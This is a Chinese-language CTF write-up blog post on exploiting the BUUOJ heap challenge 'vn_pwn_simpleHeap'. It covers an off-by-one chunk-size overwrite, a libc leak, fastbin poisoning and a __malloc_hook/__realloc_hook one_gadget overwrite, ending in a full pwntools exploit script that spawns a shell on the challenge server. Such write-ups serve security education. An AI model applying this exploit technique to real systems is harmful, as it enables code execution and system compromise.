---
layout: "page"
title:  "Buuoj冲分过程-vn_pwn_simpleHeap"
subtitle: "一个glibc堆利用的例子 🍺明けましておめでとうございます😆"
date:   2021-01-02 21:15:38 +0800
categories:
  - blog
tags:
  - pwn
  - glibc
  - heap
---

# 正文

sub_C39 函数有一个 off-by-one 漏洞，会从stdin读取、写入多一个字节。根据堆内存的chunk结构，我们可以覆盖下一个chunk `mchunk_size`的最后一个字节并修改chunk的大小，然后利用chunk的分裂特点、分配得到重叠的chunk并泄露出 `main_arena.top` 的地址；进一步利用重叠的chunk修改 fastbin并在 main_arena 上方构造大小为0X7F的chunk，最终实现写入任意地址到 `__malloc_hook` 。

## Leak libc

0. 先使得大于 `global_max_fast` 的 chunk 覆盖另一个正在使用的小 chunk；
1. 释放大chunk ，使其进入 unsorted 并被写入 `main_arena.top`的地址；
2. 申请内存使得大chunk发生分裂，`main_arena.top` 的地址写入到小chunk；
3. 输出小chunk并泄露`main_arena.top`

## Gadget

```
ubuntu@VM-0-5-ubuntu:~/project/kayoch1n.github.io/buuoj$ one_gadget /lib/x86_64-linux-gnu/libc.so.6 0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

## Issues

这道题不能把 gadget 直接写入到 `__malloc_hook`：在ubuntu16.04 x86_64 上调试发现，rsp+0x30，rsp+0x50，rsp+0x70处的值都不为0，栈的情况并不能满足任意一个 gadget 的要求；但是通过查阅谷歌了解到另一种方法，这种方法在构造chunk的时候，将 `__realloc_hook` 覆盖为 gadget 的地址，将 `__malloc_hook` 覆盖为一个在 `__libc_realloc` 内的地址 ；触发getshell的调用路径变为 `malloc`->`__libc_malloc`->`__malloc_hook`(address in `__libc_realloc`)->`__realloc_hook`(gadget)。这个方法通过增加调用过程（call压入RA以及function prologue）、加上 `__libc_realloc` 内的push等指令（见下）调整栈顶，使栈上的数据尽量满足gadget的要求。

```
(gdb) disas __libc_realloc
Dump of assembler code for function __GI___libc_realloc:
   0x00007f6b07bc7710 <+0>:     push   %r15       # 
   0x00007f6b07bc7712 <+2>:     push   %r14       #
   0x00007f6b07bc7714 <+4>:     push   %r13       #
   0x00007f6b07bc7716 <+6>:     push   %r12       #
   0x00007f6b07bc7718 <+8>:     mov    %rsi,%r12  #
   0x00007f6b07bc771b <+11>:    push   %rbp       #
   0x00007f6b07bc771c <+12>:    push   %rbx       #
   0x00007f6b07bc771d <+13>:    mov    %rdi,%rbx  #
   0x00007f6b07bc7720 <+16>:    sub    $0x38,%rsp # 以上指令调整栈顶
   0x00007f6b07bc7724 <+20>:    mov    0x33f8a5(%rip),%rax        # 0x7f6b07f06fd0
   0x00007f6b07bc772b <+27>:    mov    (%rax),%rax
   0x00007f6b07bc772e <+30>:    test   %rax,%rax
   0x00007f6b07bc7731 <+33>:    jne    0x7f6b07bc7958 <__GI___libc_realloc+584>
...
   0x00007f6b07bc7958 <+584>:   mov    0x68(%rsp),%rdx
   0x00007f6b07bc795d <+589>:   callq  *%rax      # 触发getshell
...
```

上述指令来自本地libc.so.6；事实上该指令片段和题目提供的libc-2.23.so的指令内容是一致的，只是偏移有差别。本地调试给 `__libc_realloc` 打上断点，检查此时栈顶的结构：

```
(gdb) x/32gx $rsp
0x7ffc3042aa68: 0x000055f11f8d3b71      0x000055f11f8d38e0 # sub    $0x38,%rsp 
0x7ffc3042aa78: 0x0000002000000006      0x00007ffc3042aaa0 #
0x7ffc3042aa88: 0x000055f11f8d3f86      0x00007ffc3042ab80 # 
0x7ffc3042aa98: 0x0000000100000000      0x000055f11f8d3fd0 #
0x7ffc3042aaa8: 0x00007f6b07b63840(rbx) 0x0000000000000000(rbp)
0x7ffc3042aab8: 0x00007ffc3042ab88(r12) 0x0000000108132ca0(r13)
0x7ffc3042aac8: 0x000055f11f8d3f0a(r14) 0x0000000000000000(r15)
0x7ffc3042aad8: 0x14df0f89e95ddc50      0x000055f11f8d38e0 
0x7ffc3042aae8: 0x00007ffc3042ab80      0x0000000000000000
0x7ffc3042aaf8: 0x0000000000000000      0x40c55016c39ddc50
0x7ffc3042ab08: 0x41eb3ffff90ddc50      0x0000000000000000
0x7ffc3042ab18: 0x0000000000000000      0x0000000000000000 # +0x50
0x7ffc3042ab28: 0x00007ffc3042ab98      0x00007f6b08134168 
0x7ffc3042ab38: 0x00007f6b07f1d80b      0x0000000000000000 # +0x70
0x7ffc3042ab48: 0x0000000000000000      0x000055f11f8d38e0
0x7ffc3042ab58: 0x00007ffc3042ab80      0x0000000000000000
```

如果使用 `__libc_realloc` 覆盖 `__malloc_hook`，同样无法满足任意一个gadget的要求；设想不借助push以及sub指令下的栈结构，rsp+0x50及rsp+0x70都可以满足；因此选择使用 0xf0364(0xf02a4) 作为gadget，用 __libc_realloc+20 处的地址覆盖 __malloc_hook。本地可以成功getshell，但是远程打不通；因此尝试调整gadget，选择使用 0xf1207(0xf1147)，ok，顺利打通。

## Payload

```python
#!/usr/bin/python3.6
from pwn import *

filename = './vn_pwn_simpleHeap'
# p = process(filename)
p = remote('node3.buuoj.cn', 25658)
# libc = ELF('/home/ubuntu/glibc-2.23/lib/libc-2.23.so')
libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def Add(content, size=None):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'size?', bytes(f'{size or len(content)}', encoding='utf8'))
    p.sendlineafter(b'content:', content)


def Edit(index, content):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'idx?', bytes(f'{index}', encoding='utf8'))
    p.sendlineafter(b'content:', content)


def Show(index):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'idx?', bytes(f'{index}', encoding='utf8'))


def Delete(index):
    p.sendlineafter(b'choice: ', b'4')
    p.sendlineafter(b'idx?', bytes(f'{index}', encoding='utf8'))


def Exit():
    p.sendlineafter(b'choice: ', b'5')

Add(b'0', 0x28)   # 0
Add(b'1', 0x68)   # 1
Add(b'2', 0x68)   # 2
Add(b'3', 0x20)   # 3
payload = b'\x00'*0x28 +b'\xe1'
Edit(0,payload)   # 修改下一个chunk的大小
Delete(1)

Add(b'11', 0x68,)  # 1
Show(2)

leaked = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
main_arena = leaked - 88
realloc_hook = main_arena - 0x18
libc_base = realloc_hook - libc.sym['__realloc_hook']

# one_gadgets = [0xf0364]
one_gadgets = [0xf1147, 0xf02a4]

realloc = libc_base + libc.sym['realloc']
log.success(f'&main_arena: {hex(main_arena)}, &realloc_hook: {hex(realloc_hook)},&realloc: {hex(realloc)}, &libc_base: {hex(libc_base)}')

Add(b'i4and2infact', 0x60)  # 4 and 2
Delete(2)
fake_chunk = main_arena - 0x33
payload = p64(fake_chunk)
Edit(4, payload)
#p.interactive()
Add(b'5', 0x60)
gadget = one_gadgets[0]+libc_base
log.success(f'gadget: {hex(gadget)}')

Add(b'\x00' * 11 + p64(gadget) + p64(realloc+20), 0x60)

p.sendlineafter(b'choice: ', b'1')
p.sendlineafter(b'size?', b'32')
p.interactive()
```